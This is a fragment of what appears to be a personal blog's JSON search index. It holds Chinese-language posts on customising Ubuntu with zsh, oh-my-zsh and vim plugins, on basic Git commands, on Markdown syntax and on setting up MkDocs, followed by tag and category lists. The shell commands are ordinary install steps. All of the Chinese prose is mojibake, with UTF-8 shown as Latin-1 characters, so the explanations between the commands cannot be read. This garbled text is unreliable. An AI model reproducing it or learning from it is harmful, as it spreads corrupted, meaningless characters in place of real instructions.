unity-tweak-toolå¦‚æœå‡ºç°æŠ¥é”™éœ€è¦å®‰è£…ç¼ºå¤±çš„åŒ… å®‰è£… Flatabulous ä¸»é¢˜sudo add-apt-repository ppa:noobslab/themessudo apt updatesudo apt install flatabulous-themeä¸»é¢˜sudo add-apt-repository ppa:noobslab/iconssudo apt updatesudo apt install ultra-flat-iconså›¾æ ‡unity-tweak-tool -&gt; ä¸»é¢˜/å›¾æ ‡ å­—ä½“Monaco Powerline ä¹Ÿå¯ä»¥é€‰æ‹©å…¶ä»–å­—ä½“,ä½†ä¸€å®šè¦æ”¯æŒPowerlineçš„,å¦åˆ™åæ–‡ä¼šå‡ºç°ä¹±ç  III. ç»ˆç«¯Terminalç¾åŒ– Terminal zsh sudo apt install zsh git clone https://github.com/robbyrussell/oh-my-zsh.git cd oh-my-zsh/tools ./install.sh æ›´æ¢é»˜è®¤shell chshæŒ‰æ­¥éª¤æ¥è¾“å…¥zshåœ°å€ zshæ’ä»¶ è‡ªåŠ¨è¡¥å…¨ git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions å¿«é€Ÿè·³è½¬ git clone https://github.com/joelthelion/autojump.git cd autojump ./install.pyæŒ‰è¦æ±‚æŠŠä»£ç å¡«å†™åˆ°~/.zshrcæ–‡ä»¶å°¾ é…ç½® vim ~/.zshrc ä¿®æ”¹60è¡Œå·¦å³çš„pluginsplugins=(git autojump zsh-suggestions) ä¿®æ”¹çš®è‚¤ ~/.zshrcä¸­çš„ZSH_THEME=&quot;robbyrussell&quot;æ›´æ”¹ IV. vimç¾åŒ– molokai mkdir ~/.vim/colors å°†æœ¬ä»“åº“ä¸­çš„molokai.vimå¤åˆ¶åˆ°~/.vim/colors/ä¸‹ Powerline sudo apt install python-pip pip install git+git://github.com/powerline/powerline pip show powerline-status æŒ‰ç…§å…·ä½“ä½ç½®æ›´æ”¹~/.vimrcä¸­çš„set rtp+=...ä¸€è¡Œ(åæ–‡) æ’ä»¶ pathogenæ’ä»¶ç®¡ç† mkdir -p ~/.vim/autoload ~/.vim/bundle curl -LSso ~/.vim/autoload/pathogen.vim https://tpo.pe/pathogen.vim nerdtreeæ–‡ä»¶æµè§ˆå™¨ cd ~/.vim/bundle git clone https://github.com/scrooloose/nerdtree.git taglistå¤§çº²ç•Œé¢taglistå®˜ç½‘ ä¸‹è½½åè§£å‹åˆ°~/.vim/bundle/ä¸‹ vimrc å°†æœ¬ä»“åº“ä¸­çš„vimrc.txtå¤åˆ¶åˆ°~/.vimrcä¸­ å†…åŒ…å«æ‹¬å·åŒ¹é…,htmlæ ‡ç­¾åŒ¹é…,powerlineé…ç½®(å¯èƒ½éœ€è¦æ”¹åŠ¨),cpp.sh.java.pyçš„æ–‡ä»¶å¤´è‡ªåŠ¨è¾“å…¥,æ’ä»¶çš„é…ç½®(F3æ‰“å¼€nerdtree,F4æ‰“å¼€taglist) å‚è€ƒ CSDNåšå®¢powerlinevimæ’ä»¶monaco powerlineå­—ä½“monokaiä¸»é¢˜WPS","link":"/p/f2ddc0e6.html"},{"title":"Gitç®€å•ç”¨æ³•","text":"Gitæ˜¯ä¸€æ¬¾ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶ï¼Œé…åˆGitHubå¯ä»¥æ›´å¥½çš„æ§åˆ¶ä»£ç  SSH Key1234$ ssh-keygen -t rsa -C &quot;975062472@qq.com&quot;$ cd ~/.ssh$ cat id_rsa.pub$ ssh -T git@github.com åˆ›å»ºä»“åº“12345678910$ mkdir study_cpp$ cd study_cpp/$ echo &quot;# test&quot; &gt;&gt; README.md$ lsREADME.md$ git init$ git add README.md$ git commit -m &quot;æ·»åŠ  README.md æ–‡ä»¶&quot;$ git remote add origin git@github.com:Tony031218/study_cpp.git$ git push -u origin master å…‹éš†1$ git clone git@github.com:Tony031218/study_cpp æå–12$ git fetch origin$ git merge origin/master æ¨é€123$ git add &lt;filename&gt;$ git commit -m &quot;æ¨é€ä¿¡æ¯&quot;$ git push origin master è¿œç¨‹ä»“åº“1234$ git remote add origin2 git@github.com:Tony031218/study_cpp.git$ git remote -v$ git remote rm origin2$ git remote -v åˆ†æ”¯12345$ git checkout -b graph //åˆ›å»ºåˆ†æ”¯ï¼Œå¹¶åˆ‡æ¢è¿‡å»$ git checkout master //å›åˆ°ä¸»åˆ†æ”¯$ git push origin graph //å°†åˆ†æ”¯æ¨é€åˆ°è¿œç¨‹ä»“åº“$ git pull //å°†æœ¬åœ°ä»“åº“æ›´æ–°$ git diff graph master //æ˜¾ç¤ºå·®åˆ« å…‹éš†åˆ†æ”¯1234$ git clone -b &lt;branch_name&gt; &lt;repo_url&gt; //å…‹éš†å•ä¸ªåˆ†æ”¯$ cd &lt;repo&gt;$ git branch -a //æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯$ git checkout -b &lt;branch_name&gt; origin/&lt;branch_name&gt; //å…³è”åˆ†æ”¯","link":"/p/e779c345.html"},{"title":"Markdownè¯­æ³•","text":"Markdownæ˜¯ä¸€æ¬¾ç®€æ´å®ç”¨çš„æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼Œå¯ä»¥åœ¨mkdocs,hexoä¸­ä½¿ç”¨ 123456# ä¸€çº§æ ‡é¢˜## äºŒçº§æ ‡é¢˜### ä¸‰çº§æ ‡é¢˜#### å››çº§æ ‡é¢˜##### äº”çº§æ ‡é¢˜###### å…­çº§æ ‡é¢˜ ä¸‹åˆ’çº¿ 1234---*******---- ç›®å½•[TOC] æ–‡å­—æ ·å¼** **åŠ ç²—* *å€¾æ–œ*** ***å€¾æ–œåŠ ç²—~~ ~~åˆ é™¤ å¼•ç”¨&gt;ä¸€çº§ &gt;&gt;äºŒçº§ å¼•ç”¨ äºŒçº§å¼•ç”¨ å¼•ç”¨ ç©ºè¡Œ&amp;nbsp; æˆ– &lt;br/&gt;&nbsp; ç©ºæ ¼&amp;emsp;&emsp;&emsp;ç©ºæ ¼ å›¾ç‰‡![å›¾ç‰‡å](å›¾ç‰‡åœ°å€ &quot;title&quot;) æˆ–ä½¿ç”¨htmlæ ‡ç­¾&lt;img src=&quot;...&quot; width=&quot;...&quot; height=&quot;...&quot; /&gt; é“¾æ¥[ç½‘é¡µå](åœ°å€ &quot;title&quot;)ç™¾åº¦ ä»£ç å—12345678#include&lt;bits/stdc++.h&gt;using namespace std;int main(){ printf(&quot;hello markdown&quot;); return 0;} åºè¡¨ æœ‰åº1 æœ‰åº2 æœ‰åº3 + æˆ– - æˆ– * æ— åº æ— åº æ— åº ä¸€çº§æ— åº äºŒçº§æ— åº ä¸‰çº§æ— åº å››çº§æ— åº ä»»åŠ¡åˆ—è¡¨- [ ] ...- [x] ...mkdocséœ€è¦pymdownä¸­çš„pymdownxæ¨¡å—GitHubæ”¯æŒ è¡¨æ ¼123|è¡¨å¤´|è¡¨å¤´|è¡¨å¤´||:----------|:----------:|----------:|| å·¦å¯¹é½ |å±…ä¸­|å³å¯¹é½| è¡¨å¤´ è¡¨å¤´ è¡¨å¤´ å·¦å¯¹é½ å±…ä¸­ å³å¯¹é½ å†…è”CSS&lt;p style=&quot;color: #AD5D0F;font-size: 30px; font-family: 'Consolas';&quot;&gt;CSS&lt;/p&gt; CSS è¯­ä¹‰æ ‡è®°123456&lt;i&gt;æ–œä½“&lt;/i&gt;&lt;b&gt;åŠ ç²—&lt;/b&gt;&lt;em&gt;å¼ºè°ƒ&lt;/em&gt;ä¸Šæ ‡ï¼š Z&lt;sup&gt;a&lt;/sup&gt;ä¸‹æ ‡ï¼š Z&lt;sub&gt;a&lt;/sub&gt;é”®ç›˜æ–‡æœ¬ï¼š &lt;kbd&gt;Ctrl&lt;/kbd&gt; æ–œä½“ åŠ ç²— å¼ºè°ƒ ä¸Šæ ‡ï¼š Za ä¸‹æ ‡ï¼š Za é”®ç›˜æ–‡æœ¬ï¼š Ctrl å…¬å¼æ–‡æ¡£æœ«å°¾æ·»åŠ  12345678&lt;script type=&quot;text/javascript&quot; async src=&quot;https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/x-mathjax-config&quot;&gt;MathJax.Hub.Config({ tex2jax: {inlineMath: [['$','$'], ['\\\\(','\\\\)']]}});&lt;/script&gt; ä½¿ç”¨$\\LaTeX$è¯­æ³•ç¼–å†™å…¬å¼$$x \\href{why-equal.html} {=} y^2 + 1$$$$x = {-b \\pm \\sqrt{b^2-4ac} \\over 2a}$$ MathJax.Hub.Config({ tex2jax: {inlineMath: [['$','$'], ['\\\\(','\\\\)']]} });","link":"/p/3c50d03d.html"},{"title":"MkDocsä½¿ç”¨æ–¹æ³•","text":"mkdocsæ˜¯ä¸€æ¬¾åŸºäºpython markdownçš„é¡¹ç›®æ–‡æ¡£å·¥å…·,å¯ä»¥ç”¨æ¥ç¼–å†™ä¸€ä¸ªç½‘ç«™ å®‰è£…å®‰è£…python3åŠpip1234$ sudo apt install python3 #å®‰è£…python$ sudo apt install python3-pip #å®‰è£…pip$ python3 --version #æ£€æŸ¥pythonæ˜¯å¦å®‰è£…æˆåŠŸ$ pip3 --version #æ£€æŸ¥pipæ˜¯å¦å®‰è£…æˆåŠŸ å®‰è£…mkdocs12# pip3 install mkdocs #æ³¨æ„ä»¥rootæƒé™å®‰è£…# mkdocs --version #æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ ä½¿ç”¨12$ mkdocs new test #åˆ›å»ºä¸€ä¸ªåä¸ºtestçš„æ–‡ä»¶å¤¹,å­˜å‚¨ä»£ç $ cd test æ­¤æ—¶çš„ç›®å½•ç»“æ„ 1234test/ â”œâ”€â”€ docs/ #å­˜æ”¾markdownæ–‡æ¡£ â”‚ â””â”€â”€ index.md #ä¸»é¡µ â””â”€â”€ mkdocs.yml #é…ç½®æ–‡ä»¶ 1$ mkdocs serve #å¼€å¯å†…å»ºæœåŠ¡å™¨ åœ¨æµè§ˆå™¨ä¸­è¾“å…¥127.0.0.1:8000é¢„è§ˆ,ç»ˆç«¯é”®å…¥Ctrl+Cå…³é—­æœåŠ¡å™¨ 1$ mkdocs build #ç”Ÿæˆé™æ€ç½‘é¡µä»£ç  è¿™æ—¶å·²ç»ç”Ÿæˆäº†site/æ–‡ä»¶å¤¹,å¯ä»¥å°†é‡Œé¢çš„å†…å®¹éƒ¨ç½²åˆ°ç½‘ç«™ä¸Šäº† é…ç½®æ–‡ä»¶site_name: å¿…é¡»å­˜åœ¨,æ–‡æ¡£ä¸»æ ‡é¢˜åç§°site_favicon: å›¾æ ‡,å­˜æ”¾åœ¨docs/æ–‡ä»¶å¤¹ä¸‹theme: ä¸»é¢˜æ ·å¼ä¾‹å¦‚: 12345theme: name: 'material' #ä½¿ç”¨materialä¸»é¢˜,éœ€è¦pipå®‰è£…mkdocs-material language: 'zh' #ä½¿ç”¨ä¸­æ–‡ feature: tabs: true #ä½¿ç”¨ä¸Šæ–¹tabæ ï¼ˆå¯æ”¹ä¸ºfalseï¼‰ ç›®å½•ç»“æ„123nav: - 'Index': index.md - 'About': about.md æ‰©å±•æ‰§è¡Œ$ pip3 install pymdown-extensionså®‰è£…æ‰©å±•åŒ… 12345markdown_extensions: - admonition #æ”¯æŒæ³¨è§£ - codehilite: #ä»£ç å—é«˜äº® linenums: true #ä»£ç å—æ˜¾ç¤ºè¡Œå· - pymdownx.tasklist #æ”¯æŒä»»åŠ¡åˆ—è¡¨ !!! warning â€œæ³¨æ„â€ ä¸€å®šè¦äº‹å…ˆå®‰è£…å¥½æ‰©å±•ï¼Œå¦åˆ™ä¸èƒ½å‡ºç°é¢„æœŸæ•ˆæœ å‚è€ƒMkDocsä¸­æ–‡æ–‡æ¡£MkDocså®˜æ–¹æ–‡æ¡£cyentçš„æ•™ç¨‹","link":"/p/ce42b873.html"}],"tags":[{"name":"Cpp","slug":"Cpp","link":"/tags/Cpp/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","link":"/tags/%E7%AE%97%E6%B3%95/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"blog","slug":"blog","link":"/tags/blog/"},{"name":"markdown","slug":"markdown","link":"/tags/markdown/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"manim","slug":"manim","link":"/tags/manim/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","link":"/tags/%E7%AC%94%E8%AE%B0/"},{"name":"Haskell","slug":"Haskell","link":"/tags/Haskell/"},{"name":"mkdocs","slug":"mkdocs","link":"/tags/mkdocs/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"github","slug":"github","link":"/tags/github/"},{"name":"NOIp","slug":"NOIp","link":"/tags/NOIp/"},{"name":"æ¸¸è®°","slug":"æ¸¸è®°","link":"/tags/%E6%B8%B8%E8%AE%B0/"},{"name":"CSP-S","slug":"CSP-S","link":"/tags/CSP-S/"},{"name":"é¢˜è§£","slug":"é¢˜è§£","link":"/tags/%E9%A2%98%E8%A7%A3/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"Writeup","slug":"Writeup","link":"/tags/Writeup/"},{"name":"èŒƒç•´è®º","slug":"èŒƒç•´è®º","link":"/tags/%E8%8C%83%E7%95%B4%E8%AE%BA/"},{"name":"Luogu","slug":"Luogu","link":"/tags/Luogu/"},{"name":"æ•°è®º","slug":"æ•°è®º","link":"/tags/%E6%95%B0%E8%AE%BA/"},{"name":"è«é˜Ÿ","slug":"è«é˜Ÿ","link":"/tags/%E8%8E%AB%E9%98%9F/"},{"name":"Rust","slug":"Rust","link":"/tags/Rust/"},{"name":"å›¾è®º","slug":"å›¾è®º","link":"/tags/%E5%9B%BE%E8%AE%BA/"},{"name":"å·®åˆ†çº¦æŸ","slug":"å·®åˆ†çº¦æŸ","link":"/tags/%E5%B7%AE%E5%88%86%E7%BA%A6%E6%9D%9F/"},{"name":"dsu on tree","slug":"dsu-on-tree","link":"/tags/dsu-on-tree/"},{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","link":"/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"å¹¶æŸ¥é›†","slug":"å¹¶æŸ¥é›†","link":"/tags/%E5%B9%B6%E6%9F%A5%E9%9B%86/"},{"name":"å·¦åæ ‘","slug":"å·¦åæ ‘","link":"/tags/%E5%B7%A6%E5%81%8F%E6%A0%91/"},{"name":"æ ‘çŠ¶æ•°ç»„","slug":"æ ‘çŠ¶æ•°ç»„","link":"/tags/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"name":"çº¿æ®µæ ‘","slug":"çº¿æ®µæ ‘","link":"/tags/%E7%BA%BF%E6%AE%B5%E6%A0%91/"},{"name":"ç½‘ç»œæµ","slug":"ç½‘ç»œæµ","link":"/tags/%E7%BD%91%E7%BB%9C%E6%B5%81/"},{"name":"è´¹ç”¨æµ","slug":"è´¹ç”¨æµ","link":"/tags/%E8%B4%B9%E7%94%A8%E6%B5%81/"},{"name":"æœ€çŸ­è·¯","slug":"æœ€çŸ­è·¯","link":"/tags/%E6%9C%80%E7%9F%AD%E8%B7%AF/"},{"name":"bfs","slug":"bfs","link":"/tags/bfs/"},{"name":"çŠ¶æ€å‹ç¼©","slug":"çŠ¶æ€å‹ç¼©","link":"/tags/%E7%8A%B6%E6%80%81%E5%8E%8B%E7%BC%A9/"},{"name":"æœ€å¤§æµ","slug":"æœ€å¤§æµ","link":"/tags/%E6%9C%80%E5%A4%A7%E6%B5%81/"},{"name":"bug","slug":"bug","link":"/tags/bug/"},{"name":"éšç¬”","slug":"éšç¬”","link":"/tags/%E9%9A%8F%E7%AC%94/"},{"name":"ç”Ÿæ´»","slug":"ç”Ÿæ´»","link":"/tags/%E7%94%9F%E6%B4%BB/"},{"name":"AtCoder","slug":"AtCoder","link":"/tags/AtCoder/"},{"name":"SPOJ","slug":"SPOJ","link":"/tags/SPOJ/"},{"name":"è®¡ç®—å‡ ä½•","slug":"è®¡ç®—å‡ ä½•","link":"/tags/%E8%AE%A1%E7%AE%97%E5%87%A0%E4%BD%95/"}],"categories":[{"name":"C++ç®—æ³•","slug":"C-ç®—æ³•","link":"/categories/C-%E7%AE%97%E6%B3%95/"},{"name":"manim","slug":"manim","link":"/categories/manim/"},{"name":"ç¬”è®°","slug":"manim/ç¬”è®°","link":"/categories/manim/%E7%AC%94%E8%AE%B0/"},{"name":"æ¸¸è®°","slug":"æ¸¸è®°","link":"/categories/%E6%B8%B8%E8%AE%B0/"},{"name":"é¢˜è§£","slug":"é¢˜è§£","link":"/categories/%E9%A2%98%E8%A7%A3/"},{"name":"Writeup","slug":"Writeup","link":"/categories/Writeup/"},{"name":"ç¬”è®°","slug":"C-ç®—æ³•/ç¬”è®°","link":"/categories/C-%E7%AE%97%E6%B3%95/%E7%AC%94%E8%AE%B0/"},{"name":"æ•°æ®ç»“æ„","slug":"C-ç®—æ³•/ç¬”è®°/æ•°æ®ç»“æ„","link":"/categories/C-%E7%AE%97%E6%B3%95/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"å›¾è®º","slug":"C-ç®—æ³•/ç¬”è®°/å›¾è®º","link":"/categories/C-%E7%AE%97%E6%B3%95/%E7%AC%94%E8%AE%B0/%E5%9B%BE%E8%AE%BA/"},{"name":"ç½‘ç»œæµ24é¢˜","slug":"é¢˜è§£/ç½‘ç»œæµ24é¢˜","link":"/categories/%E9%A2%98%E8%A7%A3/%E7%BD%91%E7%BB%9C%E6%B5%8124%E9%A2%98/"},{"name":"ç”Ÿæ´»","slug":"ç”Ÿæ´»","link":"/categories/%E7%94%9F%E6%B4%BB/"}]}